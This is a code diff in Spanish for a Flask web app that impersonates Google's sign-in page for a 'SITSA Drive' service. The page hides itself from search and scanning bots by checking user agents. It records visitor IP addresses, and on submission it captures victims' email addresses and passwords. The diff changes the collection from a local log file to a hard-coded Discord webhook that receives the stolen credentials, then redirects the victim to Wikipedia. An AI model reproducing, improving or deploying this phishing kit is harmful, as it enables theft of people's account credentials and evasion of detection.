@@ -1,9 +1,20 @@
 from flask import Flask, request, render_template_string, redirect
 import datetime
+import requests # <--- Importante para enviar a Discord
 
 app = Flask(__name__)
 
-# --- HTML: INTERFAZ DE LOGIN DE GOOGLE (OFUSCADA) ---
+# Reemplaza esto con la URL que copiaste de Discord
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1490462183333560331/1Kj8NnWCOF9LHAHdYOiHzK4Nbt-71VeE6SloJbG-oY5U8OJ9s9tiLIl8M9R5b8ZTo4OW"
+
+def enviar_a_discord(mensaje):
+    data = {"content": mensaje}
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=data)
+    except Exception as e:
+        print(f"Error enviando a Discord: {e}")
+
+# --- HTML de LOGIN (El mismo que ya tenías) ---
 HTML_LOGIN = '''
 <!DOCTYPE html>
 <html lang="es">
@@ -30,15 +41,9 @@ HTML_LOGIN = '''
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="logo" alt="Google">
         <h1>Iniciar sesión</h1>
         <p>Usa tu cuenta de Google para acceder a <b>SITSA Drive</b></p>
-        
         <form action="/auth" method="POST">
             <input type="email" name="user_mail" placeholder="Correo electrónico o teléfono" required>
             <input type="password" name="user_pass" placeholder="Introduce tu contraseña" required>
-            
-            <div style="text-align: left; margin-top: 10px;">
-                <a href="#" class="create-account">¿Has olvidado tu correo electrónico?</a>
-            </div>
-
             <div class="btn-container">
                 <a href="#" class="create-account">Crear cuenta</a>
                 <button type="submit" class="btn-next">Siguiente</button>
@@ -51,41 +56,39 @@ HTML_LOGIN = '''
 
 @app.route('/')
 def index():
-    # Filtro de bots para evitar que Google escanee el formulario
     ua = request.headers.get('User-Agent', '').lower()
     bots = ['googlebot', 'crawler', 'lighthouse', 'headless']
     if any(bot in ua for bot in bots):
         return "Not Found", 404
 
-    # Registro de visita
     ip_header = request.headers.get('X-Forwarded-For')
     ip_real = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
     
-    with open("log.txt", "a") as f:
-        f.write(f"\n--- INTENTO DE ACCESO ---\nFecha: {datetime.datetime.now()}\nIP: {ip_real}\n")
+    # Notificar visita inicial a Discord
+    enviar_a_discord(f"🔔 **Nueva Visita**\nIP: `{ip_real}`\nFecha: {datetime.datetime.now()}")
     
     return render_template_string(HTML_LOGIN)
 
 @app.route('/auth', methods=['POST'])
 def auth():
-    # Capturamos los datos enviados por el formulario
     correo = request.form.get('user_mail')
     clave = request.form.get('user_pass')
     
-    # Guardamos las credenciales en el log
-    with open("log.txt", "a") as f:
-        f.write(f"CREDENTIALS -> Correo: {correo} | Pass: {clave}\n")
-    
-    # Redirigimos a la Wikipedia o al Drive real para que no sospechen
-    return redirect("https://es.wikipedia.org/wiki/Phishing")
+    ip_header = request.headers.get('X-Forwarded-For')
+    ip_real = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
 
-@app.route('/ver-resultados')
-def ver():
-    try:
-        with open("log.txt", "r") as f:
-            return f"<pre>{f.read()}</pre>"
-    except:
-        return "Sin capturas."
+    # Enviar credenciales capturadas a Discord con formato llamativo
+    mensaje_discord = (
+        f"⚠️ **¡CREDENCIALES CAPTURADAS!** ⚠️\n"
+        f"**Correo:** `{correo}`\n"
+        f"**Password:** `{clave}`\n"
+        f"**IP:** `{ip_real}`\n"
+        f"------------------------------------"
+    )
+    enviar_a_discord(mensaje_discord)
+    
+    # Redirigir a un sitio seguro
+    return redirect("https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica")
 
 if __name__ == "__main__":
     app.run()
